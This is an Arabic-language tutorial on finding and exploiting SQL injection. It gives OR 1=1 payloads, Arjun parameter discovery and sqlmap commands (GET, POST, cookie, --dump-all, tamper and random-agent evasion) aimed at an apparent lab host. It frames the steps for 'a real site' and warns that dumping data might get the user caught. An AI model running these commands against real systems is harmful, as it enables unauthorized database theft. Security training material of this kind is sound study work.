## SQL Injection
هو استغلال ثغرات في استعلامات قواعد البيانات لجلب أو تعديل البيانات بدون إذن.

- مثال لاستعلام خاطئ:
```sql
SELECT * FROM users WHERE username="" OR 1=1;
```



- شكل الـ Input: بيكون صندوق لإدخال اسم المستخدم (username) في واجهة البرنامج، وغالبًا بيتم تمرير البيانات المدخلة للاستعلام في قاعدة البيانات.

- **الأمر المدخل**:
```sql
" OR 1=1;
```

- **الهدف**: جعل شرط الاستعلام دائمًا صحيحًا (1=1 دايمًا صحيح)، وبالتالي بيتم استخراج كل البيانات من الجدول بدلًا من التحقق من اسم المستخدم فقط.

- **النتيجة**: كل الصفوف في جدول `users` بتظهر لأن الشرط `OR 1=1` صحيح دائمًا.
---



- غالبًا ثغرات **SQL Injection** وأي ثغرات متعلقة بمعالجة البيانات بتكون موجودة في الملفات اللي امتدادها `.php`، لأنها الأكثر استخدامًا لمعالجة المدخلات والربط بقاعدة البيانات.

- مثال على ملف قد يحتوي على الثغرة:
```
https://example.com/file.php?id=1
--> select * from users where username'$id';

https://example.com/file.php?id=' or 1=1;#
--> select * from users where username'' or 1=1;#';
```

- السبب: ملفات PHP غالبًا بتتعامل مع مدخلات المستخدم وترسل استعلامات لقاعدة البيانات، وده بيخليها معرضة للاستغلال لو مفيش فلترة مناسبة.


---

# طريقة الحصول على الثغرة في موقع حقيقي

## 1- استخراج الـ Parameter باستخدام أداة Arjun

- **الأمر المستخدم**:
```
arjun -u http://94.237.49.212:52229/case1.php
```

![image](https://github.com/user-attachments/assets/dad9329d-ebbe-4208-8b10-109a42622b73)


---

## 2- استخدام أداة SQLMap

- **الأمر المستخدم**:
```bash
sqlmap -u "http://94.237.49.212:52229/case1.php?id=*"
```
**طلبات الأداة**:

- **Yes** عند سؤال `Do you want to process it?`  
  - (الأداة عايزة تتأكد إنك عايز تختبر الـ Parameter.)

- **Yes** عند سؤال `Do you want to skip test payloads specific for other DBMSes?`  
  - (الأداة بتسألك لو عايز تتجنب اختبارات لغير MySQL.)

- **Yes** عند سؤال `Do you want to include all tests for 'MySQL'?`  
  - (الأداة عايزة تأكيد لاختبار كل الأنواع الممكنة لـ MySQL.)



- **تحذيرات (Warnings)**:
![image](https://github.com/user-attachments/assets/b38f94d1-e375-4b5a-9b06-7a3085fa0df3)
![image](https://github.com/user-attachments/assets/884fd12a-812b-4a2e-89e1-8b42ad9a5bc5)

  - `URI parameter '#1*' is vulnerable.`
- **الـ Payload المستخدم**:
```
http://94.237.49.212:52229/case1.php?id=-7973 OR 4567=4567#
```
---
## استخراج جميع البيانات باستخدام SQLMap

- **الأمر المستخدم**:
```
sqlmap -u "http://94.237.49.212:52229/case1.php?id=*" --dump-all
```
### - خلي باللك من الامر ده لان ممكن الشركة تمسكك
---
## رفع مستوى المخاطر باستخدام SQLMap

- **الأمر المستخدم**:
```
sqlmap -u "http://94.237.49.212:52229/case1.php?id=*" --risk 3 --level 5
---
```
# التعامل مع طلبات POST بدلاً من GET

- مش كل الثغرات بتكون في الطلبات من نوع **GET**. في بعض الحالات، الثغرة بتكون في الطلبات من نوع **POST**.

## استخدام أداة Arjun مع POST

- في الحالة العادية، عند تشغيل أداة Arjun بدون تحديد نوع الطلب (POST)، قد لا يتم اكتشاف أي بارامترات.
- **الأمر العادي (GET)**:
```
arjun -u http://94.237.49.212:52229/case2.php
```
- **المخرجات (بدون اكتشاف)**:
![image](https://github.com/user-attachments/assets/ef719bba-c286-4c98-a40b-0e19036cf4bc)

---

- لتحديد أن الطلب من نوع **POST**، يجب إضافة الخيار `-m post` مع الأمر.
- **الأمر مع POST**:
```
arjun -u http://94.237.49.212:52229/case2.php -m post
```
- **المخرجات (اكتشاف بارامتر id)**:
![image](https://github.com/user-attachments/assets/00a40450-5c4b-4e18-a357-63342d3b28b3)

---

## ملاحظات

- **GET** يتم عادةً استخدامه مع الروابط، وبالتالي سهل اكتشاف البارامترات.
- **POST** يحتاج لتعريف نوع الطلب لتتمكن الأدوات مثل Arjun من معالجته بشكل صحيح.

---

# استخدام SQLMap مع طلبات POST

- عند اكتشاف أن الثغرة موجودة في بارامتر يتم إرساله عبر **POST**، يجب استخدام الخيار `--data` في SQLMap لتحديد البيانات المرسلة.

## الأمر المستخدم
- لتحديد بارامتر `id` في طلب POST:
```
sqlmap -u "http://94.237.49.212:52229/case2.php" --data "id=*"
```

## شرح الأمر:
- `-u`: تحديد عنوان الـ URL الخاص بالموقع.
- `--data`: تحديد البيانات المرسلة في طلب POST، مع وضع `*` في البارامتر الذي نريد اختباره.

---

# استغلال SQL Injection في الكوكيز (Cookie Value)

- يمكن أن تحدث ثغرة SQL Injection داخل قيم الكوكيز المرسلة مع الطلبات.

---

## الخطوة 1: فهم الكوكيز

- يتم إرسال الكوكيز كجزء من طلب HTTP.
- مثال على الكوكي:
```
Cookie: session=xx; id=1; dofaijo=osdjfiao;
```

---

## الخطوة 2: استخدام SQLMap لاختبار الكوكيز

- SQLMap يمكنه اختبار القيم داخل الكوكيز باستخدام الخيار `--cookie`.

- **الأمر المستخدم**:
```
sqlmap -u "http://94.237.49.212:52229/case3.php" --cookie="id=*"
```

---

## شرح الأمر:

- `--cookie`: يحدد القيم المراد اختبارها في الكوكي، مع وضع `*` لتحديد البارامتر المراد استغلاله.

---
# استخدام Burp Suite لتسهيل الاختبار

- بدلًا من تجربة الطرق الثلاثة يدويًا (GET, POST, Cookie)، يمكنك اعتراض الطلبات باستخدام أداة **Burp Suite**.

---

## الخطوة 1: اعتراض الطلب

- قم باعتراض الطلب باستخدام **Burp Suite**.
- انسخ الطلب بالكامل من Burp Suite.

---

## الخطوة 2: حفظ الطلب في ملف

- احفظ الطلب في ملف نصي باستخدام محرر النصوص مثل **nano**.
- مثال:
```
nano req.txt
```

---

## الخطوة 3: استخدام SQLMap مع الطلب

- قم بتمرير الملف النصي لـ SQLMap باستخدام الخيار `-r`.
- **الأمر المستخدم**:
- يمكنك تحسين الهجمات باستخدام خيارات إضافية مثل `--tamper` و`--random-agent`.
```
sqlmap -r req.txt --risk 3 --level 5
sqlmap -r req.txt --risk 3 --level 5 --tamper=space2comment --random-agent
```

---


## المزايا:

- يوفر الوقت والجهد.
- يمكن التعامل مع الطلبات المعقدة بسهولة، مثل الطلبات التي تحتوي على:
  - بارامترات POST.
  - القيم الموجودة في Cookie.
  - بيانات مخصصة أو إضافية.
